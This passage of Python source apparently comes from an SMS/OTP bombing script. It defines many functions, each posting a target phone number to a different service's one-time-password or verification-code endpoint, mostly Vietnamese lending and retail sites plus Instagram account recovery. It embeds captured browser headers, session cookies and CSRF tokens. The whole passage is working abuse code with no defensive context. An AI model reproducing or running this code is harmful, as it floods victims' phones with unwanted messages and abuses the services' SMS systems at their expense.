	requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
###
def a17(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
###
def a18(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
###
def a19(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
###
def a20(phone):
  cookies = {
        '_gcl_au': '1.1.1533157498.1692614502',
    '_gid': 'GA1.2.781528153.1692614503',
    '_gat_UA-38936689-1': '1',
    '_pk_id.8.8977': '5d30d75f9e6743e4.1692614503.',
    '_pk_ses.8.8977': '1',
    'cebs': '1',
    '_ce.clock_event': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEm7kElENUN03DSuBvuD5TICbnYVlatLXCm0.1',
    '_ce.clock_data': '-787%2C14.255.194.150%2C1%2C3357fadb0316939352bbdd4d5360a97f',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKkhaeu_W28quqX5cGW9Jrgp_Do5EFmc5Nk-DuQ8sfYP2czvitG0ic9FF1FlE_M29yBw3uifqWb54xYVXk1a7mwcNn7yZ5liuqWIpp9kBG1A1aY-HLC-GVf_9CjIw-xgz4',
    'DMX_Personal': '%7B%22UID%22%3A%22252f22cca0536398e17c80eb9105c5b0e0e31a19%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    '_ga_Y7SWKJEHCE': 'GS1.1.1692614502.1.1.1692614505.57.0.0',
    '_ga': 'GA1.2.2035828444.1692614503',
    'cebsp_': '2',
    'SvID': 'new2692|ZOM/b|ZOM/a',
    'lhc_per': 'vid|1a9f0fa3e5e1dd95517a',
    '_ce.s': 'v~62edb685e77145d9d4e24378fcb030e087877171~lcw~1692614518363~vpv~0~v11.rlc~1692614504033~gtrk.la~llkqzd2h~lcw~1692614518506',
    }
  headers = {
        'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
  data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvLiBgP95iPfAbcVI8VyYoCfEyfdEJGRZsePthIP3yr283W3MpWu85Jes2fBDAn9f5Sd5W3OVDOn6X1WWUn0y7xL92DqFpheSaUXFJussPLA9YLaNMnlb-gB0bjjr0H1sok',
}

  response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

def a22(phone):
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
###
def fa(phone):
  cookies = {
        '_ga': 'GA1.2.1651025600.1692762277',
    '_gid': 'GA1.2.215967924.1692762277',
    '_ga_9B0FYPSWN9': 'GS1.2.1692762277.1.1.1692762287.50.0.0',
    'serverChoice': 'Server-IPv2',
    }
  headers = {
        'authority': 'fateammod.000webhostapp.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.2.1651025600.1692762277; _gid=GA1.2.215967924.1692762277; _ga_9B0FYPSWN9=GS1.2.1692762277.1.1.1692762287.50.0.0; serverChoice=Server-IPv2',
    'origin': 'https://fateammod.000webhostapp.com',
    'referer': 'https://fateammod.000webhostapp.com/index.php',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'FAMOD',
}

  response = requests.post('https://fateammod.000webhostapp.com/index.php', cookies=cookies, headers=headers, data=data)
def a23(phone):
	cookies = {
    '_ssid': 'q5x3i1pubkczg4ibm3ojurkr',
    '_cart_': '6f014021-0e14-4f90-8084-6e0bd135fc82',
    '__ckmid': 'e732d166851341afb4e3f18d1c8f7acb',
    '_gcl_au': '1.1.482081756.1692526069',
    '_gid': 'GA1.2.576982242.1692526070',
    '_gat_UA-1035222-8': '1',
    '_ga': 'GA1.1.2326278.1692526070',
    '_ga_L0FCVV58XQ': 'GS1.1.1692526070.1.1.1692526081.49.0.0',
    '_ga_YE9QV6GZ0S': 'GS1.1.1692526071.1.1.1692526088.0.0.0',
}

	headers = {
    'authority': 'meta.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    # 'cookie': '_ssid=q5x3i1pubkczg4ibm3ojurkr; _cart_=6f014021-0e14-4f90-8084-6e0bd135fc82; __ckmid=e732d166851341afb4e3f18d1c8f7acb; _gcl_au=1.1.482081756.1692526069; _gid=GA1.2.576982242.1692526070; _gat_UA-1035222-8=1; _ga=GA1.1.2326278.1692526070; _ga_L0FCVV58XQ=GS1.1.1692526070.1.1.1692526081.49.0.0; _ga_YE9QV6GZ0S=GS1.1.1692526071.1.1.1692526088.0.0.0',
    'origin': 'https://meta.vn',
    'referer': 'https://meta.vn/account/register',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

	params = {
    'api_mode': '1',
}

	json_data = {
    'api_args': {
        'lgUser': phone,
        'act': 'send',
        'type': phone,
    },
    'api_method': 'CheckExist',
}

	response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def a21(phone):
    cookies = {
        '_gcl_au': '1.1.309447918.1692615536',
    '_gid': 'GA1.2.1715264339.1692615536',
    '_gac_UA-187725374-2': '1.1692615536.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_hjSessionUser_2281843': 'eyJpZCI6IjQ3MjdhZmU2LTUwZTUtNTI1Yi1hMDM0LWE5NmYyODM2NTlkMCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyNzksImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_2281843': '0',
    '_hjSession_2281843': 'eyJpZCI6IjVjYjA5NmVlLTEyOTMtNDI1NS04MjNiLTk2OTA2YWVhNzdmZCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyOTQsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_fbp': 'fb.1.1692615536318.2070074030',
    '_ga_K15C064VTW': 'GS1.2.1692615536.1.0.1692615536.60.0.0',
    '_tt_enable_cookie': '1',
    '_ttp': 'w06Lg8BcCLaKDJGog5p2fh4MR__',
    '_fw_crm_v': '624460c4-e99a-4505-8671-6775f481f4e3',
    '_hjIncludedInSessionSample_2281853': '0',
    '_hjSession_2281853': 'eyJpZCI6ImQ5MzQ2ZjY5LTk1MjMtNDM3NC1hMDljLTgxNjYxMjhlMjExNCIsImNyZWF0ZWQiOjE2OTI2MTU1NDYxOTIsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjSessionUser_2281853': 'eyJpZCI6Ijg1OTg1NmVhLTI4YWEtNTVlZS1hN2Q4LTJlNTA4YWFhNWNhYSIsImNyZWF0ZWQiOjE2OTI2MTU1NDU0ODUsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga_ZBQ18M247M': 'GS1.1.1692615536.1.1.1692615613.50.0.0',
    '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNTMzMTkwMA.WaEQZqkAYaDmYZm52clJNLAi739p2FnvP4Lg8yE8CNk',
    '_gcl_aw': 'GCL.1692615615.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_gat_UA-187725374-1': '1',
    '_ga_ZN0EBP68G5': 'GS1.1.1692615545.1.1.1692615614.60.0.0',
    '_ga': 'GA1.2.114114010.1692615536',
    '_gac_UA-187725374-1': '1.1692615616.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    '_ga_03H0F9NHEX': 'GS1.2.1692615545.1.1.1692615615.60.0.0',
    }

    headers = {
        'authority': 'lk.takomo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
# 'cookie': '_gcl_au=1.1.309447918.1692615536; _gid=GA1.2.1715264339.1692615536; _gac_UA-187725374-2=1.1692615536.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE; _hjSessionUser_2281843=eyJpZCI6IjQ3MjdhZmU2LTUwZTUtNTI1Yi1hMDM0LWE5NmYyODM2NTlkMCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyNzksImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjVjYjA5NmVlLTEyOTMtNDI1NS04MjNiLTk2OTA2YWVhNzdmZCIsImNyZWF0ZWQiOjE2OTI2MTU1MzYyOTQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1692615536318.2070074030; _ga_K15C064VTW=GS1.2.1692615536.1.0.1692615536.60.0.0; _tt_enable_cookie=1; _ttp=w06Lg8BcCLaKDJGog5p2fh4MR__; _fw_crm_v=624460c4-e99a-4505-8671-6775f481f4e3; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6ImQ5MzQ2ZjY5LTk1MjMtNDM3NC1hMDljLTgxNjYxMjhlMjExNCIsImNyZWF0ZWQiOjE2OTI2MTU1NDYxOTIsImluU2FtcGxlIjpmYWxzZX0=; _hjSessionUser_2281853=eyJpZCI6Ijg1OTg1NmVhLTI4YWEtNTVlZS1hN2Q4LTJlNTA4YWFhNWNhYSIsImNyZWF0ZWQiOjE2OTI2MTU1NDU0ODUsImV4aXN0aW5nIjp0cnVlfQ==; _ga_ZBQ18M247M=GS1.1.1692615536.1.1.1692615613.50.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNTMzMTkwMA.WaEQZqkAYaDmYZm52clJNLAi739p2FnvP4Lg8yE8CNk; _gcl_aw=GCL.1692615615.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1692615545.1.1.1692615614.60.0.0; _ga=GA1.2.114114010.1692615536; _gac_UA-187725374-1=1.1692615616.EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE; _ga_03H0F9NHEX=GS1.2.1692615545.1.1.1692615615.60.0.0',
    'origin': 'https://lk.takomo.vn',
    'referer': 'https://lk.takomo.vn/?phone=phone&amount=10000000&term=30&utm_source=google_search&utm_medium=ThanhBinh-TKM&utm_campaign=google_search_cpc_VH_All_ThanhBinh_2&utm_term=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_2_1&utm_content=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___2_1_1&gad=1&gclid=EAIaIQobChMI0KW8m8ztgAMVya6WCh14FgSjEAAYAiAAEgK3RfD_BwE',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    json_data = {

        'phone': phone,
        'code': 'resend',
        'channel': 'ivr',
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
def a24(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)
###
def a25(phone):
  cookies = {
        'lang': 'vi-VN',
    '_gid': 'GA1.2.162175187.1692767917',
    '_gcl_au': '1.1.1392401524.1692767918',
    'c': 'zMXcyX4X-1692767920021-3f46874aecdd11814596635',
    '_ga': 'GA1.3.20410514.1692767917',
    '_gid': 'GA1.3.162175187.1692767917',
    '_gac_UA-55135171-7': '1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    'MgidSensorUtmSource': 'google',
    'MgidSensorClidV': '0',
    '_fbp': 'fb.1.1692767920777.185567813',
    '_tt_enable_cookie': '1',
    '_ttp': 'eezki2H7q3-MigGjGivw9VHcKmT',
    '_SI_VID_1.43672efc5d000118b53cfe67': '21b15ab3630a453252c171e9',
    '_SI_DID_1.43672efc5d000118b53cfe67': '6343c55f-d611-3f08-850c-19d2aec3a9c9',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'aZY9EGoYugdC/DBk4FGNGyzSwbbr7lNgAO0pOT/Mzz4=',
    'trackingId': 'prescore-3794d538-2e06-4f77-98a8-ad1cec99eea5',
    '_gcl_aw': 'GCL.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_gac_UA-166784548-1': '1.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_ga': 'GA1.2.20410514.1692767917',
    '_gac_UA-55135171-7': '1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_ga_HQ2YVF8108': 'GS1.3.1692767920.1.1.1692768080.0.0.0',
    'MgidSensorNVis': '6',
    'MgidSensorHref': 'https://vaytienmat.homecredit.vn/bat-dau-vay',
    '_fmdata': 'hn%2BAOPSKPYxJSzgnVZfTO1ymgXJSaRzSsKwMEjI%2BjTn7JFFh%2BLV1Oe62zGDhtY8LIURfbdxxsTalgm1WjGIJ0g%3D%3D',
